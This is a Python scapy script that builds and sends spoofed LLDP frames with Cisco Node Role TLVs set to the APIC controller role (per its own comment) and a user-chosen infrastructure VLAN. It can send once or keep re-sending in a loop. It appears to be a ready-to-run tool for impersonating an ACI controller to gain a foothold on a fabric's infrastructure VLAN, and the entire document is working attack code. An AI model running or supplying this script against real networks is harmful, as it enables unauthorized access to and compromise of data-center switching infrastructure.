#!/usr/bin/python3

from scapy.all import *
from scapy.utils import *
import argparse
import time

parser = argparse.ArgumentParser()
parser.add_argument("iface", help="Network Interface")
parser.add_argument("vlan", type=int, help="Infra Vlan Id")
parser.add_argument("-T","--ttl", type=int, help="Time-to-Live, default is 60", default=60)
parser.add_argument("-R","--refresh", type=int, help="Refresh Rate")

args = parser.parse_args()

# TLV Type: Chassis Id; Subtype: MAC Address
chassis = bytearray(9)
chassis[0:3] = (0x02,0x07,0x04)
chassis[3:] = (0x11,0x22,0x33,0x44,0x55,0x66)

# TLV Type: Port ID; Subtype: MAC Address
port = bytearray(9)
port[0:3] = (0x04,0x07,0x03)
port[3:] = (0x11,0x22,0x33,0x44,0x55,0x66)

# TLV Type: Time to Live
TTL = bytearray(4)
TTL[0:2] = (0x06,0x02)
TTL[2:4] = struct.pack('>H', args.ttl)

# TLV Type: Organization Specific; Subtype: Node Role
nodeRole = bytearray(7)
nodeRole[0:2] = (0xfe,0x05)
nodeRole[2:5] = (0x00,0x01,0x42)
nodeRole[5] = (0xca)
nodeRole[6] = (0x00) # Node Role: 0 (for APIC)

# TLV Type: Organization Specific; Subtype: Infrastructure VLAN
vlan = bytearray(8)
vlan[0:2] = (0xfe,0x06)
vlan[2:5] = (0x00,0x01,0x42)
vlan[5] = (0xd3)
vlan[6:8] = struct.pack('>H', args.vlan)

end = bytearray( (0x00, 0x00) )

payload = bytes(chassis + port + TTL + nodeRole + vlan + end)

mac_lldp_multicast = '01:80:c2:00:00:0e'

eth = Ether(src='a0:48:1c:dc:86:1d', dst=mac_lldp_multicast, type=0x88cc)
frame = eth / Raw(load=bytes(payload))

if args.refresh:
  print("[*] Refresh mode activated. Sending LLDP packet every " + str(args.refresh) + " seconds!")
  while True:
    try:
      sendp(frame, iface=args.iface, verbose=False)
      print("[*] Sent LLDP packet!")
      time.sleep(args.refresh)
    except KeyboardInterrupt:
      print("[*] Shutting down!")
      exit(0)
    except PermissionError:
      print("[*] Script must be started as root or with cap_net_raw capabilities!")
      exit(0)
else:
  try:
    sendp(frame, iface=args.iface, verbose=False)
    print("[*] Sent LLDP packet!")
  except PermissionError:
    print("[*] Script must be started as root or with cap_net_raw capabilities!")
    exit(0)
